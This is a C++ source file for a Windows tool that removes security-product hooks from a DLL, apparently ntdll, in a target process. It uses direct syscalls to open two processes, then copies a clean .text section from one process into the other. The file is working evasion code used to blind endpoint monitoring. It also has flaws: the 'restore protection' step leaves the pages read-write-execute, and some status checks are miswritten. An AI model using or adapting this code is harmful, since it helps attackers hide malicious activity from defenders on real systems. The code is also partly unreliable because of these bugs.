#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE

#include <Windows.h>
#include <stdio.h>
#include "InterProcessSectionCopying.h"
#include <DbgHelp.h>
#include <string>
#include "sysc_sw2.h"
#include <Psapi.h>

#pragma comment (lib, "Dbghelp.lib")

#define bytesToCompare 16

int unhook(DWORD sourcePid, DWORD targetPid, LPCSTR dllName)
{
	printf("Reading source and target...\n");

	//Open process using syscalls
	HANDLE processHandleTarget = NULL;
	OBJECT_ATTRIBUTES ObjectAttributesTarget;
	InitializeObjectAttributes(&ObjectAttributesTarget, NULL, 0, NULL, NULL);
	CLIENT_ID uPidTarget = { 0 };
	uPidTarget.UniqueProcess = (HANDLE)targetPid;
	uPidTarget.UniqueThread = (HANDLE)0;
	NTSTATUS statusOpenTarget = ZwOpenProcess10(&processHandleTarget, SYNCHRONIZE | STANDARD_RIGHTS_REQUIRED | 0xFFFF, &ObjectAttributesTarget, &uPidTarget);
    if (!statusOpenTarget == STATUS_SUCCESS)
    {
        printf("ERROR: Open target proc!");
        return -1;
    }

	//Open process using syscalls
	HANDLE processHandleSource = NULL;
	OBJECT_ATTRIBUTES ObjectAttributesSource;
	InitializeObjectAttributes(&ObjectAttributesSource, NULL, 0, NULL, NULL);
	CLIENT_ID uPidSource = { 0 };
	uPidSource.UniqueProcess = (HANDLE) sourcePid;
	uPidSource.UniqueThread = (HANDLE)0;
	NTSTATUS statusOpenSource = ZwOpenProcess10(&processHandleSource, SYNCHRONIZE | STANDARD_RIGHTS_REQUIRED | 0xFFFF, &ObjectAttributesSource, &uPidSource);
    if (!statusOpenSource == STATUS_SUCCESS)
    {
        printf("ERROR: Open source proc!");
        return -2;
    }

    HMODULE dllToFix = GetModuleHandleA(dllName);
    MODULEINFO moduleInfo = {};

    //Get DLL information based on loaded version for current process
    if (GetModuleInformation(GetCurrentProcess(), dllToFix, &moduleInfo, sizeof(moduleInfo)) == 0) {
        printf("GetModuleInformation error: %d\n", GetLastError());
        printf("[%d]\n", __LINE__);
        return -3;
    }

    // Get base address of hooked Ntdll from MODULEINFO struct
    LPVOID hookedNtdllBaseAddress = NULL;
    hookedNtdllBaseAddress = (LPVOID)moduleInfo.lpBaseOfDll;
    if (hookedNtdllBaseAddress == 0)
    {
        printf("ERROR: Could not find base address! DLL exists?");
        return -4;
    }

    printf("%-20s 0x%p\n", "Tainted dll base address: ", hookedNtdllBaseAddress);

    PIMAGE_DOS_HEADER dosHeader = 0;
    PIMAGE_NT_HEADERS ntHeader = 0;
    PIMAGE_SECTION_HEADER sectionHeader = 0;
    LPSTR sectionName;
    SIZE_T textSectionSize = NULL;
    LPVOID hookedNtdllTextStartAddress = NULL;

    // Get DOS header
    dosHeader = (PIMAGE_DOS_HEADER)hookedNtdllBaseAddress;

    // Get Nt Header
    ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)hookedNtdllBaseAddress + dosHeader->e_lfanew);

    Sleep(50);
    // Loop through all the PE sections until we find .text section (some adapted code based on Shellycoat)
    for (SIZE_T i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        // Get PE section header
        sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        // Get section name
        sectionName = (LPSTR)sectionHeader->Name;

        // We found .text section!
        if (!strcmp(sectionName, ".text")) {
            Sleep(50);
            printf("Found .text section\n");

            textSectionSize = sectionHeader->Misc.VirtualSize;
            printf(".text section size: %d\n", textSectionSize);
            hookedNtdllTextStartAddress = (LPVOID)((DWORD_PTR)hookedNtdllBaseAddress + (DWORD_PTR)sectionHeader->VirtualAddress);
            break;
        }
    }
    if (textSectionSize == NULL)
    {
        printf("Error: .text section not found!");
        return -5;
    }

    SIZE_T lpNumberOfBytesRead = 0;
    SIZE_T lpNumberOfBytesWritten = 0;
    PVOID buffer = (PVOID)malloc((ULONG)(textSectionSize + 4096)); //4096 is page size

    printf("Reading fresh content from source...\n");
    NTSTATUS statusRead = NtReadVirtualMemory(processHandleSource, hookedNtdllTextStartAddress, buffer, textSectionSize, &lpNumberOfBytesRead);
    if (statusRead != STATUS_SUCCESS) {
        printf("NtReadVirtualMemory error: %X\n", statusRead);
        return -6;
    }
    //Remove page protection (store old details)
    printf("Removing page protection...\n");
    ULONG oldProtection;
    NTSTATUS statusProtect = ZwProtectVirtualMemory10(processHandleTarget, &hookedNtdllTextStartAddress, &textSectionSize, PAGE_EXECUTE_READWRITE, &oldProtection);
    if (statusProtect != STATUS_SUCCESS) {
        printf("ZwProtectVirtualMemory10 error: %X\n", statusProtect);
        return -7;
    }

    //Write fresh DLL
    printf("Writing fresh content to target...\n");
    NTSTATUS statusWrite = ZwWriteVirtualMemory10(processHandleTarget, hookedNtdllTextStartAddress, buffer, textSectionSize, &lpNumberOfBytesWritten);
    if (statusWrite != STATUS_SUCCESS) {
        printf("ZwWriteVirtualMemory10 error: %X\n", statusWrite);
        return -8;
    }

    //Restore right page protections
    printf("Restoring page protection...\n");
    NTSTATUS statusRestore = ZwProtectVirtualMemory10(processHandleTarget, &hookedNtdllTextStartAddress, &textSectionSize, PAGE_EXECUTE_READWRITE, &oldProtection);
    if (statusRestore != STATUS_SUCCESS) {
        printf("ZwProtectVirtualMemory10 error: %X\n", statusRestore);
        return -9;
    }
    CloseHandle(processHandleSource);
    CloseHandle(processHandleTarget);
    printf("Done!\n");
	return 0;
}

int wmain(int argc, wchar_t* argv[]) {
		
	if (argc != 4)
	{
		printf("Supply source pid, target pid and dllname as arguments. \n");
		return -1;
	}

	DWORD sourcePid = _wtoi(argv[1]);
	DWORD targetPid = _wtoi(argv[2]);

    std::wstring wDll(argv[3]); //convert to wstring
    std::string sDll(wDll.begin(), wDll.end()); //and convert to string.
    LPCSTR dllName = (LPCSTR)sDll.c_str();

	printf("\nUnhooking by Interprocess Section Copying (TM) \n\n");

	printf("                                ,w                      \n");
	printf("                              ,@*                       \n");
	printf("                    ,w,    ,@\"                            \n");                     
	printf("                    \"~w   gP                                 \n");                  
	printf("                         ,@` ww,                                 \n");
	printf("                        gP  '~=\"                                    \n");            
	printf("                    /@@@@r                                             \n");
	printf("                     $NM\",w~w,                                            \n");
	printf("                  - @\"  j-    $                                              \n");
	printf("    @K            gP     \"*~r\"`, ggN@MM & &&&MM & Nwg, \n");
	printf("  a]@\"          ,@`  w*\"*w   ,g@$|||@lllllllllllll||T$m,                  ,g@C  \n");
	printf("   ]P         gP`    N,,,A,@M||@llll@llllllllllllllllll|T&g,         ,g@M$@C    \n");
	printf("    @     ,g@\"          ,@$|ll$ Mll$|llll|lg@@@g||lllllllll||MNmgggMT|lly@      \n");
	printf("     \"***\"`              ]@ | lll | ll$ | llllll | TMNN@@@@@@lllllllllllllllllll@`      \n");
	printf("                           \"Bglll]Wlllllllllllllllllllllllllll|@@m@@glll%W      \n");
	printf("                             '*N@$lllllllllllllllllll||g@@NM*`       *N@|%w     \n");
	printf("                                  \"*RN@@@@@@@@@NRP*\"\"\"`                 *@@w    \n");
	printf("                                                                          \"\"  \n");

	printf("Source pid: %d\n\n", sourcePid);
	printf("Target pid: %d\n\n", targetPid);

	return unhook(sourcePid, targetPid, dllName);
}